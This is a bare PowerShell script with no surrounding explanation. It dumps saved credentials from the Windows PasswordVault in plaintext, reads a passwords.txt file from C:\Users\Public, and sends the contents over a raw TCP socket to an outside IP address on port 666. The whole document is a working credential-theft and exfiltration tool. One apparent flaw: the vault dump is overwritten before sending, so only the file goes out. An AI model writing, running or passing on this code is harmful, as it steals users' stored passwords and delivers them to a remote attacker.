[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] 
$message = (new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
cd C:\Users\Public
$port=666
$remoteHost = "209.151.149.234"
$message = type passwords.txt
$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
$data = [System.Text.Encoding]::ASCII.GetBytes($message)
$stream = $socket.GetStream()
$stream.Write($data, 0, $data.Length)
